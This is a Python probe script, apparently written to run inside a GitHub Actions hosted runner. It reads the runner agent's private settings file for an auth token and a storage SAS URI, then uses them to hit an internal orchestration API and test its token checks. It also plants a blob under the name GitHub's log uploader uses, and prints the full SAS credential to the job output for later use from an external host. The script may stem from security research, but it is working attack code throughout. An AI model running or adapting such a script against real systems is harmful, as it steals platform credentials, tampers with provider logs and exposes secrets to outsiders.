#!/usr/bin/env python3
"""U6 probe11 - capture the internal API's response body, write the log blob early."""
import json
import os
import subprocess
import urllib.error
import urllib.request

LINE = "=" * 72
OUT = []


def hdr(t):
    OUT.append("\n" + LINE + "\n## " + t + "\n" + LINE)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=25, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(2500).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1500).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


cfg = json.loads(open("/opt/hca/.settings", "rb").read())
container, q = cfg["diagnosticsSasUri"].split("?", 1)
base = cfg["schedulerApiUrl"].rstrip("/")
tok = cfg["authToken"]
rid = os.environ.get("GITHUB_RUN_ID", "x")

hdr("1. internal orchestration API - full response, several trace payload shapes")
shapes = [
    ("single dict", {"name": "u6", "value": 1, "type": "distribution_ms"}),
    ("list of dicts", [{"name": "u6", "value": 1, "type": "distribution_ms"}]),
    ("empty list", []),
    ("empty dict", {}),
]
for label, payload in shapes:
    st, h, b = http(base + "/trace",
                    {"Authorization": tok, "Content-Type": "application/json"},
                    method="POST", data=json.dumps(payload).encode())
    OUT.append("  POST %s  %-14s -> %s  hdrs=%s  body=%r" % (
        "/trace", label, st,
        {k: v for k, v in h.items() if k.lower().startswith("x-")}, b[:300]))

hdr("2. what does the endpoint say about a wrong token? (auth is actually checked)")
for label, t in (("valid token", tok), ("truncated token", tok[:200]),
                 ("garbage", "not-a-jwt")):
    st, h, b = http(base + "/trace",
                    {"Authorization": t, "Content-Type": "application/json"},
                    method="POST", data=b"[]")
    OUT.append("  %-16s -> %s  %s" % (label, st, b[:200].replace("\n", " ")))

hdr("3. plant the blob name GitHub's own log uploader uses")
name = "hosted-compute-agent.log"
st, h, b = http(container + "/" + name + "?" + q,
                {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain",
                 "If-None-Match": "*"},
                method="PUT", data=b"U6: written by the job before HCA uploads its own log\n")
OUT.append("PUT %s (If-None-Match:*) -> %s  reqid=%s etag=%s" % (
    name, st, h.get("x-ms-request-id"), h.get("ETag")))
OUT.append("  201 = did not exist yet; 409/412 = GitHub already put it there")

hdr("4. the container identity this job was issued")
p = dict(x.split("=", 1) for x in q.split("&"))
OUT.append("account   : %s" % container.split("/")[2])
OUT.append("container : %s" % container.split("/")[3])
OUT.append("sp=%s sr=%s st=%s se=%s" % (p.get("sp"), p.get("sr"), p.get("st"), p.get("se")))

hdr("5. record the container name so an external host can re-check it after the job ends")
OUT.append("CONTAINER_FOR_EXTERNAL_CHECK=%s" % container)
OUT.append("SAS_FOR_EXTERNAL_CHECK=%s" % cfg["diagnosticsSasUri"])
OUT.append("RUN_ID=%s" % rid)

text = "\n".join(OUT)
print(text)
